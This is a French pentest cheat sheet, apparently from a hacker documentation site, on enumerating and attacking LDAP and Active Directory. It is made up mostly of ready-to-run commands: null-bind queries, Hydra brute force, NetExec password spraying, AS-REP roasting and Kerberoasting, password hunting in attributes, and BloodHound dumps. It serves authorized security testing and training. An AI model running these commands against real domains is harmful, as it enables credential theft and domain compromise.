#  LDAP Enumeration

LDAP (Lightweight Directory Access Protocol) est un protocole d'accès aux annuaires utilisé pour interroger et modifier des services d'annuaire comme Active Directory. C'est une cible critique en pentest car il expose des informations sur les utilisateurs, groupes, ordinateurs et politiques de sécurité d'un domaine.


##  Objectifs

- Identifier le serveur LDAP / Active Directory
- Enumérer les utilisateurs et groupes
- Extraire les informations du domaine
- Tester l'accès anonyme (null bind)
- Trouver des credentials ou objets sensibles


##  Ports

| Port | Service            |
|------|--------------------|
| 389  | LDAP               |
| 636  | LDAPS (SSL)        |
| 3268 | LDAP Global Catalog |
| 3269 | LDAPS Global Catalog |


##  Quick Enumeration
::: code-group
```bash [nmap]
# Scan rapide
nmap -p389,636,3268,3269 <target>
# Enum avec nmap
nmap -p389 --script ldap-rootdse,ldap-search <target>
```
```bash [ldapsearch]
# Null bind (accès anonyme)
ldapsearch -x -H ldap://<target> -b "dc=domain,dc=com"
```
```bash [NetExec]
# Enum avec netexec
nxc ldap <target> -u '' -p ''
```
:::

##  Workflow 
```
1. Scan des ports LDAP
2. Identification du domaine (rootDSE)
3. Test null bind (accès anonyme)
4. Enumération users / groupes / computers
5. Recherche d'objets sensibles (kerberoastable, AS-REP, etc.)
6. Bruteforce / password spraying
7. Exploitation des mauvaises configurations
```


##  Nmap

### Scan basique
```bash
nmap -p389,636,3268,3269 <target>
```

### Détection version
```bash
nmap -p389 -sV <target>
```

### Scripts NSE
```bash
# RootDSE (info domaine)
nmap -p389 --script ldap-rootdse <target>

# Recherche LDAP
nmap -p389 --script ldap-search <target>

# Bruteforce
nmap -p389 --script ldap-brute <target>

# Full enum
nmap -p389 --script ldap-* <target>
```


##  Enumeration

### RootDSE  Info domaine
```bash
ldapsearch -x -H ldap://<target> -s base namingcontexts
```

### Null bind (anonyme)
```bash
ldapsearch -x -H ldap://<target> -b "dc=domain,dc=com"
```

### Avec credentials
```bash
ldapsearch -x -H ldap://<target> -D "user@domain.com" -w password -b "dc=domain,dc=com"
```

### Enum utilisateurs
```bash
ldapsearch -x -H ldap://<target> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName
```

### Enum groupes
```bash
ldapsearch -x -H ldap://<target> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=group)" cn
```

### Enum ordinateurs
```bash
ldapsearch -x -H ldap://<target> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(objectClass=computer)" cn
```

### Enum admins du domaine
```bash
ldapsearch -x -H ldap://<target> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(memberOf=CN=Domain Admins,CN=Users,dc=domain,dc=com)"
```


##  Credentials Attacks

### Bruteforce Hydra
```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ldap://<target>
```

### Password spraying NetExec
```bash
nxc ldap <target> -u users.txt -p Password123
```

### Password spraying avec domaine
```bash
nxc ldap <target> -u users.txt -p passwords.txt -d domain.com
```



##  Exploitation

### Recherche d'exploits
```bash
searchsploit ldap
```

### AS-REP Roasting (utilisateurs sans pré-auth Kerberos)

::: code-group
```bash [NetExec]
nxc ldap <target> -u user -p password --asreproast output.txt
```
```bash [impacket]
impacket-GetNPUsers domain.com/ -usersfile users.txt -no-pass -dc-ip <target>
```
:::

### Kerberoasting

::: code-group
```bash [NetExec]
nxc ldap <target> -u user -p password --kerberoasting output.txt
```
```bash [impacket]
impacket-GetUserSPNs domain.com/user:password -dc-ip <target> -request
```
:::

### Recherche de mots de passe dans les attributs LDAP
```bash
ldapsearch -x -H ldap://<target> -D "user@domain.com" -w password \
  -b "dc=domain,dc=com" "(description=*pass*)"
```


##  Post-Exploitation

- Extraire tous les objets du domaine
- Identifier les comptes à hauts privilèges
- Chercher des GPO mal configurées
- Utiliser BloodHound pour le chemin d'attaque

::: code-group
```bash [ldapdomaindump]
# Dump complet avec ldapdomaindump
ldapdomaindump <target> -u 'domain\user' -p password
```
```bash [BloodHound]
# BloodHound ingestor
bloodhound-python -u user -p password -d domain.com -dc <target> -c all
```
:::


##  Anonymous Access

### Test null bind
```bash
ldapsearch -x -H ldap://<target> -b "dc=domain,dc=com"
```

### Nmap check
```bash
nmap -p389 --script ldap-rootdse <target>
```

### NetExec null bind
```bash
nxc ldap <target> -u '' -p ''
```



##  Points d'attaque

- Null bind activé (accès anonyme)
- Credentials exposés dans les attributs LDAP
- Comptes sans pré-authentification Kerberos (AS-REP)
- SPNs exposés (Kerberoasting)
- Mauvaises ACL sur les objets AD
- LDAP signing non requis
- Passwords dans les champs `description` ou `info`



::: info Tips

- Toujours tester le null bind en premier
- Utiliser `ldapdomaindump` pour un dump structuré et lisible
- Chercher les mots `pass`, `pwd`, `cred` dans tous les attributs
- Corréler LDAP + BloodHound pour visualiser les chemins d'attaque
- LDAP sur 3268 (Global Catalog) donne accès à toute la forêt AD
- Croiser nxc + ldapsearch + BloodHound pour une couverture complète

:::


::: details  Checklist

- Port 389 / 636 ouvert
- Version et domaine identifiés (rootDSE)
- Null bind testé
- Utilisateurs énumérés
- Groupes et admins identifiés
- AS-REP Roasting testé
- Kerberoasting testé
- Passwords dans attributs cherchés
- BloodHound lancé

:::


## 🧾 Notes
```
 # Notes terrain
```




##  Tools

- [Nmap](https://nmap.org/)
- [ldapsearch](https://linux.die.net/man/1/ldapsearch)
- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
- [NetExec (NXC)](https://github.com/Pennyw0rth/NetExec)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)



## 📚 Ressources

- [HackTricks LDAP Pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap)
- [PayloadsAllTheThings LDAP](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [Impacket GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
- [ldapdomaindump GitHub](https://github.com/dirkjanm/ldapdomaindump)




<div class="page-footer">

<span>📅 ![Last updated](https://img.shields.io/github/last-commit/Hackthus/The-Hackers-237?label=Last%20updated&style=flat-square&color=gray)</span>

<span>[![✏️ Edit this page on GitHub](https://img.shields.io/badge/✏️%20Edit%20this%20page-GitHub-black?style=flat-square&logo=github)](https://github.com/Hackthus/The-Hackers-237/edit/main/docs/ldap.md)</span>

</div>
